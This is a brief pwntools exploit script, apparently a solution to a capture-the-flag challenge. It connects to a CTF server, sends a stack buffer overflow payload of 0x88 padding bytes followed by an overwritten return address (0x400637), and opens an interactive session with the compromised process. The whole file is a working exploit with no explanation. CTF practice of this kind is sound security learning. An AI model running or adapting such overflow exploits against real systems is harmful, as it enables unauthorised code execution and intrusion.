from pwn import *

io = remote('pwn.challenge.ctf.show',28291)

io.sendline(b'a'*(0x80+8)+p64(0x400637))

io.interactive()
